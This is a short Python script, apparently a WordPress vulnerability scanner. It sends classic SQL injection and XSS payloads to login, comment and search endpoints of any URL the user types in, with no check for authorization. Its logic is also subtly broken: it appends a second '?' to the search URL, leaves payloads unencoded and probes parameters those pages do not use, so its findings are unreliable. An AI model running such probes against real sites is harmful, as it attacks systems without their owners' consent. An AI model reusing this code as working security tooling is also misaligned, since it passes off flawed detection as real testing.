import requests
from bs4 import BeautifulSoup

# List of SQLi and XSS payloads
SQLI_PAYLOADS = ["' OR 1=1 --", '" OR "1"="1" --']
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "'><script>alert('XSS')</script>"]

# Common vulnerable endpoints in WordPress
ENDPOINTS = [
    "/wp-login.php",
    "/wp-comments-post.php",
    "/?s=test"  # WordPress search functionality
]

def check_sqli(url):
    print(f"[*] Checking SQL Injection on {url}")
    for payload in SQLI_PAYLOADS:
        test_url = f"{url}?id={payload}"
        response = requests.get(test_url)
        if "SQL syntax" in response.text or "mysql_fetch" in response.text:
            print(f"[+] SQL Injection Vulnerability Found: {test_url}")
        else:
            print(f"[-] No SQLi detected: {test_url}")

def check_xss(url):
    print(f"[*] Checking XSS on {url}")
    for payload in XSS_PAYLOADS:
        test_url = f"{url}?q={payload}"
        response = requests.get(test_url)
        if payload in response.text:
            print(f"[+] XSS Vulnerability Found: {test_url}")
        else:
            print(f"[-] No XSS detected: {test_url}")

def scan_wordpress_site(target):
    print(f"\n[+] Scanning WordPress site: {target}")

    for endpoint in ENDPOINTS:
        url = target.rstrip("/") + endpoint
        check_sqli(url)
        check_xss(url)

if __name__ == "__main__":
    site = input("Enter a WordPress site URL (e.g., https://example.com): ").strip()
    if not site.startswith("http"):
        site = "https://" + site  # Ensure HTTPS
    scan_wordpress_site(site)
